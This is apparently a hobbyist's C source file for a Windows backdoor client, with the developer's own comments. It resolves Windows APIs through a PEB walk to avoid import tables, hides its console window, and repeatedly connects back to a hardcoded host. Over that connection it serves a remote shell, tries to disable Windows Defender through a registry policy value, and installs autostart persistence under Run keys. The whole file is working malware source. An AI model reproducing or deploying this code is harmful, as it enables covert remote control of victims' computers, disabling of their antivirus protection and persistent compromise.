#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <process.h>
#include <sys/types.h>
#include <winnt.h>

#define LOCALTEST

#define PORT "3000"

// #define _M_X64 // for peb
#define DO_SPECIAL_PEB_FIND

#ifdef LOCALTEST
#define ADDRESS "192.168.1.96"
#else
#define ADDRESS "PUBLIC IP LOL"
#endif

#define MESSAGESIZE 10000
#define RESPONSESIZE 20000
#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char* argv[]);
SOCKET connectToServer();
void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION* pPinfo);
void attemptDefeatDefender(SOCKET* pSockfd);
void attemptRegistryPersistence(SOCKET* pSockfd);
void cleanManagerInput(char* command, size_t size);

// This version is ultimately the same, except windows functions are resolved through a peb walk.
// May be unstable

// Typedefs for the peb walk
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	BOOLEAN SpareBool;
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

typedef struct _TEB {
	PVOID Reserved1[12];
	PPEB  ProcessEnvironmentBlock;
	PVOID Reserved2[399];
	BYTE  Reserved3[1952];
	PVOID TlsSlots[64];
	BYTE  Reserved4[8];
	PVOID Reserved5[26];
	PVOID ReservedForOle;
	PVOID Reserved6[4];
	PVOID TlsExpansionSlots;
} TEB, * PTEB;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID      DllBase;
	PVOID      EntryPoint;
	ULONG      SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG      Flags;
	USHORT     LoadCount;
	USHORT     TlsIndex;
	LIST_ENTRY HashLinks;
	PVOID      SectionPointer;
	ULONG      CheckSum;
	ULONG      TimeDateStamp;
	PVOID      LoadedImports;
	PVOID      EntryPointActivationContext;
	PVOID      PatchInformation;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


typedef BOOL(WINAPI* CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef HWND(WINAPI* GETCONSOLEWINDOW)();
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LSTATUS(WINAPI* REGOPENKEYEXW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS(WINAPI* REGSETVALUEEXW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LSTATUS(WINAPI* REGCLOSEKEY)(HKEY);
typedef SOCKET(WINAPI* WSASOCKETW)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
typedef int(WINAPI* WSASTARTUP)(WORD, LPWSADATA);
typedef int(WINAPI* WSACLEANUP)();
typedef INT(WINAPI* GETADDRINFO)(PCSTR, PCSTR, PADDRINFOA, PADDRINFOA); // Different than the windows docs, windows docs might be wrong here. It was trying to tell me to use const ADDRINFOA as a pointer? Failed to build, change to pointer type.
typedef int(WINAPI* CONNECTSOCK)(SOCKET, struct sockaddr *, int);
typedef int(WINAPI* SENDSOCK)(SOCKET, char*, int, int);
typedef int(WINAPI* RECVSOCK)(SOCKET, char*, int, int);
typedef BOOL(WINAPI* SHOWWINDOW)(HWND, int);

// function pointers from pebwalk
CREATEPROCESSA pCreateProcessA; // kernel32.dll
GETCONSOLEWINDOW pGetConsoleWindow; // kernel32.dll
REGOPENKEYEXW pRegOpenKeyExW; // Advapi32.dll
REGSETVALUEEXW pRegSetValueExW; // Advapi32.dll
REGCLOSEKEY pRegCloseKey; // Advapi32.dll
WSASOCKETW pWSASocketW; // Ws2_32.dll
WSASTARTUP pWSAStartup; // Ws2_32.dll
WSACLEANUP pWSACleanup; // Ws2_32.dll
GETADDRINFO pGetAddrInfo; // Ws2_32.dll
CONNECTSOCK pConnect; // Ws2_32.dll
SENDSOCK pSend; // Ws2_32.dll
RECVSOCK pRecv; // Ws2_32.dll
SHOWWINDOW pShowWindow; // User32.dll

// These two functions are useful for getting libraries and functions
// from places besides kernel32
LOADLIBRARYA pLoadLibraryA;
GETPROCADDRESS pGetProcAddress;

// gets addresses of api functions
PVOID GetProcAddressWalk(HMODULE hModule, LPCSTR lpProcName) {
	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOSHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfFunctions);
	DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfNames);
	WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
		char* functionName = (char*)((BYTE*)hModule + pAddressOfNames[i]);
		if (strcmp(functionName, lpProcName) == 0) {
			return (PVOID)((BYTE*)hModule + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}
	return NULL;
}

PPEB getPeb() {
#if defined(_M_X64) // x64
	PTEB tebPtr = (PTEB)__readgsqword(offsetof(NT_TIB, Self));
#else // x86
	PTEB tebPtr = (PTEB)__readfsdword(offsetof(NT_TIB, Self));
#endif
	return tebPtr->ProcessEnvironmentBlock;
}

// fills function pointers from peb walk.
void GetAPIFromPeb() {
	PEB* peb;
	TEB* teb;
	PLDR_DATA_TABLE_ENTRY module;
	LIST_ENTRY* listEntry;
	HMODULE kernel32baseAddr = NULL;
	HMODULE advapi32Base = NULL;
	HMODULE ws2_32Base = NULL;
	HMODULE user32Base = NULL;

#ifdef DO_SPECIAL_PEB_FIND

	peb = getPeb();

#else
	// Get PEB from TEB
	teb = NtCurrentTeb();
	peb = teb->ProcessEnvironmentBlock;

#endif


	listEntry = peb->Ldr->InLoadOrderModuleList.Flink;
	do {
		module = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		char baseDllName[256];
		int i;
		for (i = 0; i < module->BaseDllName.Length / sizeof(WCHAR) && i < sizeof(baseDllName) - 1; i++) {
			baseDllName[i] = (char)module->BaseDllName.Buffer[i];
		}
		baseDllName[i] = '\0';

		// Check for our DLLs
		if (_stricmp(baseDllName, "kernel32.dll") == 0) {
			kernel32baseAddr = (HMODULE)module->DllBase;
		}

		if (_stricmp(baseDllName, "Advapi32.dll") == 0) {
			advapi32Base = (HMODULE)module->DllBase;
		}

		if (_stricmp(baseDllName, "Ws2_32.dll") == 0) {
			ws2_32Base = (HMODULE)module->DllBase;
		}

		if (_stricmp(baseDllName, "User32.dll") == 0) {
			user32Base = (HMODULE)module->DllBase;
		}

		listEntry = listEntry->Flink;
	} while (listEntry != &peb->Ldr->InLoadOrderModuleList);

	if (kernel32baseAddr) {
		pGetProcAddress = (GETPROCADDRESS)GetProcAddressWalk(kernel32baseAddr, "GetProcAddress");
		pLoadLibraryA = (LOADLIBRARYA)GetProcAddressWalk(kernel32baseAddr, "LoadLibraryA");
		pCreateProcessA = (CREATEPROCESSA)GetProcAddressWalk(kernel32baseAddr, "CreateProcessA");
		pGetConsoleWindow = (GETCONSOLEWINDOW)GetProcAddressWalk(kernel32baseAddr, "GetConsoleWindow");

		if(advapi32Base == NULL) advapi32Base = pLoadLibraryA("Advapi32.dll");

		pRegOpenKeyExW = (REGOPENKEYEXW)GetProcAddressWalk(advapi32Base, "RegOpenKeyExW");
		pRegSetValueExW = (REGSETVALUEEXW)GetProcAddressWalk(advapi32Base, "RegSetValueExW");
		pRegCloseKey = (REGCLOSEKEY)GetProcAddressWalk(advapi32Base, "RegCloseKey");

		if(ws2_32Base == NULL) ws2_32Base = pLoadLibraryA("Ws2_32.dll");

		pWSASocketW = (WSASOCKETW)GetProcAddressWalk(ws2_32Base, "WSASocketW");
		pWSAStartup = (WSASTARTUP)GetProcAddressWalk(ws2_32Base, "WSAStartup");
		pWSACleanup = (WSACLEANUP)GetProcAddressWalk(ws2_32Base, "WSACleanup");
		pGetAddrInfo = (GETADDRINFO)GetProcAddressWalk(ws2_32Base, "getaddrinfo");
		pConnect = (CONNECTSOCK)GetProcAddressWalk(ws2_32Base, "connect");
		pSend = (SENDSOCK)GetProcAddressWalk(ws2_32Base, "send");
		pRecv = (RECVSOCK)GetProcAddressWalk(ws2_32Base, "recv");

		if (user32Base == NULL) user32Base = pLoadLibraryA("User32.dll");

		pShowWindow = (SHOWWINDOW)GetProcAddressWalk(user32Base, "ShowWindow");

	}
}

SOCKET connectToServer() {
	SOCKET sockfd;

	struct addrinfo hints, * p, * servinfo;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	pGetAddrInfo(ADDRESS, PORT, &hints, &servinfo);

	for (p = servinfo; p != NULL; p = p->ai_next) {

		if ((sockfd = pWSASocketW(p->ai_family, p->ai_socktype, p->ai_protocol, NULL, 0, 0)) == -1) {
			// We don't want a null pointer
			if (p->ai_next == NULL) {
				break;
			}

			continue;
		} 

		break;
	}

	// We only loop here because we want to sleep on the connect, we will just hope the socket
	// WILL be good at some point (the connection manager is opened back home)

	while (pConnect(sockfd, p->ai_addr, p->ai_addrlen) != 0) {
		Sleep(5000);
	}

	return sockfd;
}

void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION * pPinfo) {
	
	char shell[60];
	char message[] = "Shell type (ex. cmd): ";

	pSend(*pSockfd, message, sizeof message, 0);
	pRecv(*pSockfd, shell, sizeof shell, 0);

	// We need to clear the carriage return to call CreateProcessA
	cleanManagerInput(shell, (size_t)sizeof shell);

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof sinfo);
	sinfo.cb = sizeof sinfo;
	sinfo.hStdInput = (HANDLE)*pSockfd;
	sinfo.hStdOutput = (HANDLE)*pSockfd;
	sinfo.hStdError = (HANDLE)*pSockfd;
	sinfo.dwFlags = STARTF_USESTDHANDLES;

	// We can use the pointer to a pinfo struct to close the process and thread later (to exit the shell)
	pCreateProcessA(NULL, shell, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, pPinfo);

	// This function is blocking, I couldn't find a good way of pulling out of the shell besides
	// killing it from within the shell, or creating another socket on another port which is yucky.
	WaitForSingleObject(pPinfo->hProcess, INFINITE);
}

// Attempts to place the "DisableAntiSpyware" key in the registry, stopping Windows Defender. Runs under process security context.
// Not sure how likely it is to have this running under admin without some serious maneuvering
void attemptDefeatDefender(SOCKET* pSockfd) {
	HKEY key;
	DWORD one = 0x00000001;
	char failed[] = "Failed to create new value.\n";
	char success[] = "Succeeded in creating registry value!\n";

	// Need to get a handle to the registry tree.
	if (pRegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &key) != ERROR_SUCCESS) {
		pSend(*pSockfd, failed, sizeof failed, 0);
		return;
	}

	// Create the value
	if (pRegSetValueExW(key, L"DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&one, sizeof(DWORD)) != ERROR_SUCCESS) {
		pSend(*pSockfd, failed, sizeof failed, 0);
		RegCloseKey(key);
		return;
	}

	pRegCloseKey(key);

	pSend(*pSockfd, success, sizeof success, 0);
	return;
}

//Attempts to add autostart to both the local machine and current user keys
void attemptRegistryPersistence(SOCKET* pSockfd) {
	TCHAR dirName[100];
	DWORD charsWritten;
	HKEY key;
	LSTATUS rv;

	char failedSys[] = "Failed to add value to system registry tree, trying user.\n";
	char gotSys[] = "Success with System Key!\n";

	char failedUser[] = "Failed to add value to system registry tree, failed persistence.\n";
	char gotUser[] = "Success with User Key!\n";
	
	// oh my god. I cannot explain how much I hate this function. This line.
	// I have spent two hours trying to figure out why it was able to print the directory but failed to
	// go to the registry, infact it showed up in the registry in chinese. It took me TWO HOURS to realize
	// (after looking at the raw binary of a correct registry entry), that the registry uses 2 byte wide characters.
	// I was using GetModuleFileNameA, which as the name clearly states DOES NOT OUTPUT WIDE CHARACTERS.
	GetModuleFileNameW(NULL, dirName, 100);

	//printf(dirName); <--- so that I remember the pain, THIS PRINTS CHARS!!! THATS WHY IT WORKED!!! THEY'RE NOT WIDE!!!
	
	if ((rv = pRegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
		pSend(*pSockfd, failedSys, sizeof failedSys, 0);
	}

	if (rv == ERROR_SUCCESS) {
		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
		if (pRegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
			pSend(*pSockfd, failedUser, sizeof failedUser, 0);
			pRegCloseKey(key);
		}
		else {
			pRegCloseKey(key);
			pSend(*pSockfd, gotSys, sizeof gotSys, 0);
			return;
		}
	}

	// Now attempt user.

	// HERE IS WHERE I ATTEMPTED 2 HOURS OF POINTLESS FIXES.

	if ((rv = pRegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
		pSend(*pSockfd, failedUser, sizeof failedUser, 0);
	}

	if (rv == ERROR_SUCCESS) {
		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
		if (pRegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
			pSend(*pSockfd, failedUser, sizeof failedUser, 0);
		}
		else {
			pSend(*pSockfd, gotUser, sizeof gotUser, 0);
		}
	}

	RegCloseKey(key);

	return;
}

// Cleaning up some stuff
void cleanManagerInput(char* command, size_t size) {

	int i;
	for (i = 0; i < (size); ++i) {
		if (command[i] == '\r' || command[i] == '\n') {
			command[i] = 0;
		}
	}

}

int main(int argc, char* argv[]) {

	GetAPIFromPeb();

#if !defined DEBUG_CLIENT
	HANDLE consoleWindow = pGetConsoleWindow();
	pShowWindow(consoleWindow, SW_HIDE);
#endif

	WSADATA WsaData;
	if (pWSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		printf("Error in WSAStartup.");
		ExitProcess(1);
	}

	SOCKET sockfd;

	char commandList[] =
		"1. Drop into a shell\n"
		"2. Attempt to stop defender\n"
		"3. Attempt registry persistence.\n";

	char commandOpt[50];

	PROCESS_INFORMATION pinfo;

	if ((sockfd = connectToServer()) == -1) {
		ExitProcess(1);
	}

	while (1) {

		memset(commandOpt, 0, sizeof commandOpt);

		pSend(sockfd, commandList, sizeof commandList, 0);
		pRecv(sockfd, commandOpt, sizeof commandOpt, 0);

		cleanManagerInput(commandOpt, (size_t)sizeof commandOpt);

		if (strcmp(commandOpt, "1") == 0) {
			startShellProcess(&sockfd, &pinfo);
			continue;
		}

		if (strcmp(commandOpt, "2") == 0) {
			attemptDefeatDefender(&sockfd);
			continue;
		}

		if (strcmp(commandOpt, "3") == 0) {
			attemptRegistryPersistence(&sockfd);
			continue;
		}

	}

	pWSACleanup();

	return 0;
}
